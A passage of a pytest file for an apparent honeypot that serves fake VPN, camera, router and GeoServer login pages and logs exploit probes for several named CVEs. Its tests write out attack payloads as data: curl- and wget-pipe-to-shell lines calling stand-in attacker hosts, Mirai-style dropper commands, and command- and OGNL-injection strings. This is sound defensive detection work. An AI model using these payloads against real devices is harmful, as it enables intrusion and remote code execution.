    for path in ["/", "/+CSCOE+/", "/+CSCOE+/logon.php", "/+CSCOL+/", "/.env"]:
        assert not tbenv.is_cisco_webvpn_path(path)


def test_cisco_webvpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CISCO_WEBVPN_ENABLED", False)
    assert not tbenv.is_cisco_webvpn_path("/+CSCOE+/logon.html")


def test_render_cisco_webvpn_logon_forms_js_shape():
    body = tbenv.render_cisco_webvpn_logon_forms_js().decode("utf-8")
    assert "window.webvpn" in body


async def test_dispatch_cisco_webvpn_logon_html(flux_client):
    resp = await flux_client.get(
        "/+CSCOE+/logon.html",
        headers={"X-Forwarded-For": "203.0.113.51", "Host": "vpn.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Secure Access SSL VPN" in text
    assert "/+CSCOE+/logon_forms.js" in text

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "cisco-webvpn-logon"
    assert entry["ciscoWebvpnPath"] == "/+CSCOE+/logon.html"


async def test_dispatch_cisco_webvpn_logon_post_logs_username_not_password(flux_client):
    resp = await flux_client.post(
        "/+CSCOE+/logon.html",
        data="Login=Login&buttonClicked=4&password=123&username=admin",
        headers={
            "X-Forwarded-For": "203.0.113.54",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cisco-webvpn-logon"
    assert entry["ciscoWebvpnUsername"] == "admin"
    assert entry["ciscoWebvpnHasPassword"] is True
    assert "password" not in entry


async def test_dispatch_anyconnect_config_auth_root_post(flux_client):
    xml = b"""<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="init" aggregate-auth-version="2">
  <version who="vpn">4.10.07073</version>
  <device-id device-type="iPhone13,1">iOS</device-id>
</config-auth>"""
    resp = await flux_client.post(
        "/",
        data=xml,
        headers={
            "X-Forwarded-For": "203.0.113.55",
            "Host": "vpn.example",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200
    body = await resp.text()
    assert "<config-auth" in body
    assert "/+CSCOE+/logon.html" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cisco-anyconnect-config-auth"
    assert entry["ciscoWebvpnPath"] == "/"
    assert entry["ciscoAnyconnectVersion"] == "4.10.07073"


async def test_dispatch_cisco_webvpn_jar(flux_client):
    resp = await flux_client.get("/+CSCOL+/Java.jar", headers={"X-Forwarded-For": "203.0.113.52"})
    assert resp.status == 200
    body = await resp.read()
    assert body.startswith(b"PK")

    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cisco-webvpn-java-jar"


async def test_dispatch_cisco_webvpn_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CISCO_WEBVPN_ENABLED", False)
    resp = await flux_client.get("/+CSCOE+/logon.html", headers={"X-Forwarded-For": "203.0.113.53"})
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake Ivanti Connect Secure / Pulse Secure trap ---


def test_ivanti_vpn_enabled_by_default():
    assert tbenv.IVANTI_VPN_ENABLED


def test_ivanti_vpn_default_paths_match_observed_sequence():
    for path in (
        "/dana-na/auth/url_default/welcome.cgi",
        "/dana-na/auth/url_admin/welcome.cgi",
        "/dana-na/auth/welcome.cgi",
        "/dana-na/auth/url_default/login.cgi",
        "/dana-cached/hc/HostCheckerInstaller.osx",
        "/dana-cached/hc/HostCheckerInstaller.exe",
        "/dana-cached/hc/HostCheckerInstaller.dmg",
        "/dana-ws/namedusers",
    ):
        assert tbenv.is_ivanti_vpn_path(path), f"expected match: {path}"


def test_ivanti_vpn_path_non_match():
    for path in [
        "/",
        "/dana-na/",
        "/dana-na/auth/",
        "/dana-na/auth/login.cgi",  # missing url_default/
        "/dana-cached/hc/",
        "/dana-cached/hc/HostCheckerInstaller.tar",  # unsupported suffix
        "/.env",
    ]:
        assert not tbenv.is_ivanti_vpn_path(path), f"unexpected match: {path}"


def test_ivanti_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
    assert not tbenv.is_ivanti_vpn_path("/dana-na/auth/url_default/welcome.cgi")


def test_render_ivanti_welcome_html_shape():
    body = tbenv.render_ivanti_welcome_html("vpn.example").decode("utf-8")
    assert "Ivanti Connect Secure" in body
    assert "/dana-na/auth/url_default/login.cgi" in body
    assert "vpn.example" in body


def test_render_ivanti_hostchecker_stub_magic_bytes():
    osx = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.osx")
    assert osx.startswith(b"\xcf\xfa\xed\xfe"), "macOS stub should carry Mach-O magic"
    exe = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.exe")
    assert exe.startswith(b"MZ"), "Windows stub should carry PE/DOS magic"
    dmg = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.dmg")
    assert dmg.startswith(b"koly"), "DMG stub should carry koly magic"


def test_render_ivanti_namedusers_json_shape():
    body = tbenv.render_ivanti_namedusers_json()
    payload = json.loads(body)
    assert payload["result"] == "success"
    assert payload["data"]["users"] == []


def test_extract_ivanti_form_username_and_password_presence():
    body = b"realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In"
    username, has_password = tbenv.extract_ivanti_form(body, "application/x-www-form-urlencoded")
    assert username == "admin"
    assert has_password is True


def test_ivanti_has_cmd_injection_indicators():
    # Several CVE-2024-21887 PoCs ship classic shell-meta payloads in the
    # JSON body posted to /dana-ws/namedusers.
    assert tbenv._ivanti_has_cmd_injection("uname -a; id", "")
    assert tbenv._ivanti_has_cmd_injection("", "id=$(id)")
    assert tbenv._ivanti_has_cmd_injection("curl http://attacker/x|bash", "")
    assert not tbenv._ivanti_has_cmd_injection("plain string", "username=admin")


async def test_dispatch_ivanti_welcome(flux_client):
    resp = await flux_client.get(
        "/dana-na/auth/url_default/welcome.cgi",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "vpn.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Ivanti Connect Secure" in text
    assert "/dana-na/auth/url_default/login.cgi" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-welcome"
    assert entry["ivantiPath"] == "/dana-na/auth/url_default/welcome.cgi"


async def test_dispatch_ivanti_login_post_logs_username_and_sets_dsid_cookie(flux_client):
    resp = await flux_client.post(
        "/dana-na/auth/url_default/login.cgi",
        data="realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In",
        headers={
            "X-Forwarded-For": "203.0.113.72",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "DSID=" in set_cookie
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-login-post"
    assert entry["ivantiUsername"] == "admin"
    assert entry["ivantiHasPassword"] is True
    assert "password" not in entry


async def test_dispatch_ivanti_hostchecker_installer(flux_client):
    resp = await flux_client.get(
        "/dana-cached/hc/HostCheckerInstaller.osx",
        headers={"X-Forwarded-For": "203.0.113.73"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert body.startswith(b"\xcf\xfa\xed\xfe")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-hostchecker-installer"


async def test_dispatch_ivanti_namedusers_flags_cmd_injection(flux_client):
    resp = await flux_client.post(
        "/dana-ws/namedusers",
        data=b'{"name":"x;id"}',
        headers={
            "X-Forwarded-For": "203.0.113.74",
            "Content-Type": "application/json",
        },
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["result"] == "success"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-namedusers"
    assert entry["ivantiHasCmdInjection"] is True


async def test_dispatch_ivanti_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/dana-na/auth/url_default/welcome.cgi",
        headers={"X-Forwarded-For": "203.0.113.75"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake IBM Aspera Faspex trap ---


def test_aspera_faspex_enabled_by_default():
    assert tbenv.ASPERA_FASPEX_ENABLED


def test_aspera_faspex_default_paths_match_observed_sequence():
    for path in (
        "/aspera/faspex/",
        "/aspera/faspex",
        "/aspera/faspex/account/logout",
        "/aspera/faspex/package_relay/relay_package",
    ):
        assert tbenv.is_aspera_faspex_path(path), f"expected match: {path}"


def test_aspera_faspex_path_non_match():
    for path in (
        "/",
        "/aspera/",
        "/aspera/faspex/account/login",
        "/aspera/faspex/admin",
        "/.env",
    ):
        assert not tbenv.is_aspera_faspex_path(path), f"unexpected match: {path}"


def test_aspera_faspex_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "ASPERA_FASPEX_ENABLED", False)
    assert not tbenv.is_aspera_faspex_path("/aspera/faspex/")


def test_render_aspera_faspex_landing_shape():
    body = tbenv.render_aspera_faspex_landing("faspex.example", "4.4.1").decode("utf-8")
    assert "IBM Aspera Faspex" in body
    assert "Version 4.4.1" in body
    assert "/aspera/faspex/session" in body
    assert "faspex.example" in body


def test_render_aspera_logout_json_shape():
    payload = json.loads(tbenv.render_aspera_logout_json())
    assert payload["status"] == "ok"
    assert payload["message"] == "signed out"
    assert payload["csrf"]


async def test_dispatch_aspera_faspex_landing(flux_client):
    resp = await flux_client.get(
        "/aspera/faspex/",
        headers={"X-Forwarded-For": "203.0.113.81", "Host": "faspex.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "IBM Aspera Faspex" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "aspera-faspex-landing"
    assert entry["asperaFaspexPath"] == "/aspera/faspex/"


async def test_dispatch_aspera_faspex_logout_captures_body_preview(flux_client):
    resp = await flux_client.post(
        "/aspera/faspex/account/logout",
        data=b"--- !ruby/hash:ActionController::Parameters\nexploit: true\n",
        headers={
            "X-Forwarded-For": "203.0.113.82",
            "Content-Type": "application/x-yaml",
        },
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["status"] == "ok"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "aspera-faspex-logout"
    assert entry["asperaFaspexMethod"] == "POST"
    assert "bodyPreview" in entry


async def test_dispatch_aspera_faspex_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "ASPERA_FASPEX_ENABLED", False)
    resp = await flux_client.get(
        "/aspera/faspex/",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake FortiGate SSL VPN trap (CVE-2024-21762 / CVE-2023-27997 bait) ---


def test_fortigate_vpn_enabled_by_default():
    assert tbenv.FORTIGATE_VPN_ENABLED


def test_fortigate_vpn_default_paths_match_observed_probes():
    for path in (
        "/remote/login",
        "/remote/logincheck",
        "/remote/fgt_lang",
        "/remote/error",
        "/api/v2/cmdb/system/admin",
        "/api/v2/cmdb/system/status",
        "/api/v2/cmdb/system/global",
        "/api/v2/monitor/router/policy",
    ):
        assert tbenv.is_fortigate_vpn_path(path), f"expected match: {path}"


def test_fortigate_vpn_path_non_match():
    for path in (
        "/",
        "/remote/",
        "/remote/login.cgi",  # close, but not the FortiOS path
        "/api/v2/cmdb/",
        "/api/v2/cmdb/firewall/policy",  # not a fingerprint path we serve
        "/.env",
    ):
        assert not tbenv.is_fortigate_vpn_path(path), f"unexpected match: {path}"


def test_fortigate_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
    assert not tbenv.is_fortigate_vpn_path("/remote/login")


def test_render_fortigate_login_html_shape():
    body = tbenv.render_fortigate_login_html("fortigate.example", "7.4.4", "2662").decode("utf-8")
    assert "/remote/logincheck" in body
    assert "FortiOS 7.4.4" in body
    assert "build 2662" in body
    assert "fortigate.example" in body


def test_render_fortigate_logincheck_format():
    body = tbenv.render_fortigate_logincheck()
    assert b"ret=1" in body
    assert b"redir=" in body


def test_render_fortigate_admin_json_shape():
    payload = json.loads(tbenv.render_fortigate_admin_json("7.4.4", "2662"))
    assert payload["http_status"] == 401
    assert payload["status"] == "error"
    assert payload["version"] == "v7.4.4"
    assert payload["build"] == 2662


def test_render_fortigate_status_json_includes_version_banner():
    payload = json.loads(tbenv.render_fortigate_status_json("fortigate.example", "7.4.4", "2662"))
    assert payload["status"] == "success"
    assert payload["results"]["version"] == "v7.4.4"
    assert payload["results"]["hostname"] == "fortigate.example"
    assert payload["results"]["serial"].startswith("FGVM")


def test_render_fortigate_router_policy_json_envelope():
    payload = json.loads(tbenv.render_fortigate_router_policy_json())
    assert payload["status"] == "success"
    assert payload["path"] == "router"
    assert payload["name"] == "policy"
    assert payload["results"] == []


def test_extract_fortigate_logincheck_form_credential_field():
    body = b"username=admin&credential=h%26unter2&ajax=1"
    username, has_password = tbenv.extract_fortigate_logincheck_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "admin"
    assert has_password is True


def test_extract_fortigate_logincheck_form_password_field_fallback():
    body = b"username=root&password=toor"
    username, has_password = tbenv.extract_fortigate_logincheck_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "root"
    assert has_password is True


def test_fortigate_has_cmd_injection_indicators():
    # CVE-2024-21762 PoC + classic shell-meta payloads.
    assert tbenv._fortigate_has_cmd_injection("uname -a; id", "")
    assert tbenv._fortigate_has_cmd_injection("", "id=$(id)")
    assert tbenv._fortigate_has_cmd_injection("curl http://attacker/x|bash", "")
    assert not tbenv._fortigate_has_cmd_injection("plain string", "username=admin")


def test_fortigate_status_serial_is_per_request_unique():
    a = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
    b = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
    assert a != b, "serial must be per-request unique — never a fixed literal"


async def test_dispatch_fortigate_login_landing(flux_client):
    resp = await flux_client.get(
        "/remote/login?lang=en",
        headers={"X-Forwarded-For": "203.0.113.91", "Host": "fortigate.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "/remote/logincheck" in text
    assert "FortiOS 7.4.4" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-login"
    assert entry["fortigatePath"] == "/remote/login"


async def test_dispatch_fortigate_logincheck_logs_username_and_sets_svpn_cookie(flux_client):
    resp = await flux_client.post(
        "/remote/logincheck",
        data="username=admin&credential=h%26unter2&ajax=1",
        headers={
            "X-Forwarded-For": "203.0.113.92",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ret=1" in text
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "SVPNCOOKIE=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-logincheck"
    assert entry["fortigateUsername"] == "admin"
    assert entry["fortigateHasPassword"] is True
    assert "credential" not in entry  # secret value never logged


async def test_dispatch_fortigate_logincheck_cookie_per_request_unique(flux_client):
    cookies = []
    for i in range(2):
        resp = await flux_client.post(
            "/remote/logincheck",
            data=f"username=u{i}&credential=p",
            headers={
                "X-Forwarded-For": f"203.0.113.{93 + i}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        assert resp.status == 200
        cookies.append(resp.headers.get("Set-Cookie", ""))
    assert cookies[0] != cookies[1]
    assert "SVPNCOOKIE=" in cookies[0]
    assert "SVPNCOOKIE=" in cookies[1]


async def test_dispatch_fortigate_admin_returns_permission_denied(flux_client):
    resp = await flux_client.get(
        "/api/v2/cmdb/system/admin",
        headers={"X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["http_status"] == 401
    assert payload["status"] == "error"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-cmdb-admin"


async def test_dispatch_fortigate_router_policy_flags_cmd_injection(flux_client):
    resp = await flux_client.post(
        "/api/v2/monitor/router/policy",
        data=b'{"name":"x;id"}',
        headers={
            "X-Forwarded-For": "203.0.113.96",
            "Content-Type": "application/json",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-monitor-router-policy"
    assert entry["fortigateHasCmdInjection"] is True


async def test_dispatch_fortigate_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/remote/login",
        headers={"X-Forwarded-For": "203.0.113.97"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Hikvision IP-camera ISAPI trap (CVE-2021-36260 bait) ---


def test_hikvision_enabled_by_default():
    assert tbenv.HIKVISION_ENABLED


def test_hikvision_default_paths_match_observed_probes():
    for path in (
        "/SDK/webLanguage",
        "/sdk/weblanguage",
        "/ISAPI/Security/userCheck",
        "/ISAPI/System/deviceInfo",
    ):
        assert tbenv.is_hikvision_path(path), f"expected match: {path}"


def test_hikvision_path_non_match():
    for path in (
        "/",
        "/sdk",
        "/SDK/",
        "/isapi/",
        "/ISAPI/Streaming/channels",  # not in our default set
        "/.env",
    ):
        assert not tbenv.is_hikvision_path(path), f"unexpected match: {path}"


def test_hikvision_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
    assert not tbenv.is_hikvision_path("/SDK/webLanguage")


def test_hikvision_has_cmdi_indicators():
    # CVE-2021-36260 ships the command in the language XML element.
    assert tbenv._hikvision_has_cmdi("", "<language>$(id)</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>`whoami`</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>en;wget http://x/y</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>en && curl http://x</language>")
    # Plain GET banner-grab is not flagged.
    assert not tbenv._hikvision_has_cmdi("", "")
    assert not tbenv._hikvision_has_cmdi("", "en")


async def test_dispatch_hikvision_sdk_weblanguage(flux_client):
    resp = await flux_client.get(
        "/SDK/webLanguage",
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<Language" in text
    assert resp.headers.get("Server") == "App-webs/"
    assert resp.headers.get("Content-Type", "").startswith("application/xml")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-sdk-weblanguage"
    assert entry["hikvisionPath"] == "/SDK/webLanguage"
    assert entry["hikvisionMethod"] == "GET"
    assert entry["hikvisionHasCmdInjection"] is False


async def test_dispatch_hikvision_isapi_deviceinfo_advertises_firmware(flux_client):
    resp = await flux_client.get(
        "/ISAPI/System/deviceInfo",
        headers={"X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<DeviceInfo" in text
    assert tbenv.HIKVISION_FIRMWARE_VERSION in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-isapi-deviceinfo"


async def test_dispatch_hikvision_flags_cmd_injection_in_body(flux_client):
    # CVE-2021-36260 PUT body shape — language parameter command injection.
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<Language><language>$(wget http://attacker/x)</language></Language>'
    )
    resp = await flux_client.post(
        "/SDK/webLanguage",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.93",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-sdk-weblanguage"
    assert entry["hikvisionMethod"] == "POST"
    assert entry["hikvisionHasCmdInjection"] is True
    assert "bodyPreview" in entry


async def test_dispatch_hikvision_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
    resp = await flux_client.get(
        "/SDK/webLanguage",
        headers={"X-Forwarded-For": "203.0.113.94"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- HNAP1 router trap (CVE-2015-2051 bait) ---


def test_hnap1_enabled_by_default():
    assert tbenv.HNAP1_ENABLED


def test_hnap1_default_paths_match_observed_probes():
    for path in (
        "/HNAP1",
        "/hnap1",
        "/HNAP1/",
        "/Hnap1/",
    ):
        assert tbenv.is_hnap1_path(path), f"expected match: {path}"


def test_hnap1_path_non_match():
    for path in (
        "/",
        "/hnap",
        "/HNAP",
        "/HNAP1/foo",  # action paths under /HNAP1/<x> are not in default set
        "/.env",
    ):
        assert not tbenv.is_hnap1_path(path), f"unexpected match: {path}"


def test_hnap1_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
    assert not tbenv.is_hnap1_path("/HNAP1")


def test_hnap1_has_cmdi_indicators():
    # CVE-2015-2051: shell-meta in the SOAPAction value.
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/`wget http://x/y;sh`"', "", "",
    )
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/$(id)"', "", "",
    )
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/Login;reboot"', "", "",
    )
    # Mirai-style dropper bodies.
    assert tbenv._hnap1_has_cmdi("", "", "wget http://x/y -O - | sh")
    assert tbenv._hnap1_has_cmdi("", "", "tftp -g -r evil.bin 192.168.1.5")
    # Plain GET banner-grab is not flagged.
    assert not tbenv._hnap1_has_cmdi("", "", "")
    assert not tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/GetDeviceSettings"', "", "",
    )


async def test_dispatch_hnap1_get_returns_devicesettings_envelope(flux_client):
    resp = await flux_client.get(
        "/HNAP1",
        headers={"X-Forwarded-For": "203.0.113.131"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<soap:Envelope" in text
    assert "<DeviceSettings" in text
    assert tbenv.HNAP1_VENDOR in text
    assert tbenv.HNAP1_MODEL in text
    assert tbenv.HNAP1_FIRMWARE_VERSION in text
    # Mathopd is a fingerprint a lot of Mirai-style scanners gate on.
    assert resp.headers.get("Server", "").startswith("Mathopd/")
    assert resp.headers.get("Content-Type", "").startswith("text/xml")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-discovery"
    assert entry["hnap1Path"] == "/HNAP1"
    assert entry["hnap1Method"] == "GET"
    assert entry["hnap1HasCmdInjection"] is False


async def test_dispatch_hnap1_post_uses_action_name_in_response(flux_client):
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
        b'<soap:Body><Login xmlns="http://purenetworks.com/HNAP1/">'
        b'<Action>request</Action><Username>admin</Username></Login>'
        b'</soap:Body></soap:Envelope>\n'
    )
    resp = await flux_client.post(
        "/HNAP1",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.132",
            "Content-Type": "text/xml",
            "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<LoginResponse" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-soap-action"
    assert entry["hnap1Method"] == "POST"
    assert entry["hnap1HasCmdInjection"] is False
    assert entry["hnap1SoapAction"].startswith('"http://purenetworks.com/HNAP1/Login')
    assert "bodyPreview" in entry


async def test_dispatch_hnap1_flags_cmd_injection_in_soapaction_header(flux_client):
    # CVE-2015-2051: shell payload concatenated into the SOAPAction value.
    resp = await flux_client.post(
        "/HNAP1",
        data=b"<soap:Envelope/>",
        headers={
            "X-Forwarded-For": "203.0.113.133",
            "Content-Type": "text/xml",
            "SOAPAction": (
                '"http://purenetworks.com/HNAP1/'
                '`wget http://1.2.3.4/x.sh -O- | sh`"'
            ),
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-soap-action"
    assert entry["hnap1HasCmdInjection"] is True
    assert "wget" in entry["hnap1SoapAction"].lower()


async def test_dispatch_hnap1_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
    resp = await flux_client.get(
        "/HNAP1",
        headers={"X-Forwarded-For": "203.0.113.134"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- GeoServer trap (CVE-2024-36401 bait) ---


def test_geoserver_enabled_by_default():
    assert tbenv.GEOSERVER_ENABLED


def test_is_geoserver_path_match():
    for path in (
        "/geoserver",
        "/geoserver/",
        "/geoserver/web/",
        "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage",
        "/geoserver/index.html",
        "/geoserver/ows",
        "/geoserver/wfs",
        "/geoserver/rest/workspaces",
        "/GeoServer/Web/",  # case-insensitive
    ):
        assert tbenv.is_geoserver_path(path), f"expected match: {path}"


def test_is_geoserver_path_non_match():
    for path in [
        "/",
        "/.env",
        "/admin/",
        "/geo",
        "/geoserveradmin",  # no trailing slash, not /geoserver itself
        "/wp-admin/",
    ]:
        assert not tbenv.is_geoserver_path(path), f"unexpected match: {path}"


def test_is_geoserver_path_disabled(monkeypatch):
    monkeypatch.setattr(tbenv, "GEOSERVER_ENABLED", False)
    assert not tbenv.is_geoserver_path("/geoserver/web/")


def test_geoserver_has_ognl_detects_runtime():
    assert tbenv._geoserver_has_ognl(
        "service=wfs&exec(Runtime.getRuntime", ""
    )
    assert tbenv._geoserver_has_ognl(
        "", '<wfs:Query><Filter><PropertyName>exec(Runtime.getRuntime().exec("id"))</PropertyName></Filter></wfs:Query>'
    )
    assert tbenv._geoserver_has_ognl(
        "evaluateProperty=foo", ""
    )


def test_geoserver_has_ognl_clean_returns_false():
    assert not tbenv._geoserver_has_ognl("service=wfs&request=GetCapabilities", "")
    assert not tbenv._geoserver_has_ognl("", "<Query>boring</Query>")


def test_render_geoserver_landing_includes_login_and_version():
    body = tbenv.render_geoserver_landing("victim.example", "2.25.1").decode("utf-8")
    assert "GeoServer" in body
    assert "2.25.1" in body
    assert "/geoserver/j_spring_security_check" in body
    assert "AboutGeoServerPage" in body


def test_render_geoserver_about_includes_version():
    body = tbenv.render_geoserver_about("h", "2.25.1").decode("utf-8")
    assert "About GeoServer" in body
    assert "2.25.1" in body


def test_render_geoserver_capabilities_xml_root_matches_service():
    body = tbenv.render_geoserver_capabilities("wms", "2.25.1").decode("utf-8")
    assert "<WMS_Capabilities" in body
    assert "</WMS_Capabilities>" in body


async def test_dispatch_geoserver_root_redirects(flux_client):
    resp = await flux_client.get(
        "/geoserver/",
        headers={"X-Forwarded-For": "203.0.113.61", "Host": "victim.example"},
        allow_redirects=False,
    )
    assert resp.status == 302
    assert resp.headers["Location"] == "/geoserver/web/"
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-redirect-root"
    assert entry["geoserverPath"] == "/geoserver/"


async def test_dispatch_geoserver_web_landing(flux_client):
    resp = await flux_client.get(
        "/geoserver/web/",
        headers={"X-Forwarded-For": "203.0.113.62", "Host": "victim.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "GeoServer" in text
    assert "Login" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-web-landing"
    assert entry["geoserverHasOgnl"] is False


async def test_dispatch_geoserver_about_page_logs_ognl_payload(flux_client):
    # AboutGeoServerPage is the CVE-2024-36401 trigger surface; an OGNL-bearing
    # query must flip geoserverHasOgnl and capture the payload preview.
    resp = await flux_client.get(
        "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage"
        "?evaluateProperty=exec(Runtime.getRuntime().exec(%22id%22))",
        headers={"X-Forwarded-For": "203.0.113.63"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "About GeoServer" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-about-page"
    assert entry["geoserverHasOgnl"] is True
    assert "geoserverPayloadPreview" in entry


async def test_dispatch_geoserver_ows_capabilities(flux_client):
    resp = await flux_client.get(
        "/geoserver/ows?service=wfs&version=2.0.0&request=GetCapabilities",
        headers={"X-Forwarded-For": "203.0.113.64"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<WFS_Capabilities" in text
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "geoserver-ogc-wfs"


async def test_dispatch_geoserver_rest_returns_401(flux_client):
    resp = await flux_client.get(
        "/geoserver/rest/workspaces",
        headers={"X-Forwarded-For": "203.0.113.65"},
    )
    assert resp.status == 401
    assert resp.headers.get("WWW-Authenticate", "").startswith("Basic ")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "geoserver-rest-401"


async def test_dispatch_geoserver_post_body_logs_ognl(flux_client):
    body = (
        b'<wfs:GetPropertyValue xmlns:wfs="http://www.opengis.net/wfs/2.0">'
        b'<valueReference>exec(Runtime.getRuntime().exec(\'id\'))</valueReference>'
        b'</wfs:GetPropertyValue>'
    )
    resp = await flux_client.post(
        "/geoserver/wfs",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.66",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-ogc-wfs"
    assert entry["geoserverHasOgnl"] is True


async def test_dispatch_geoserver_disabled_returns_404(flux_client, monkeypatch):
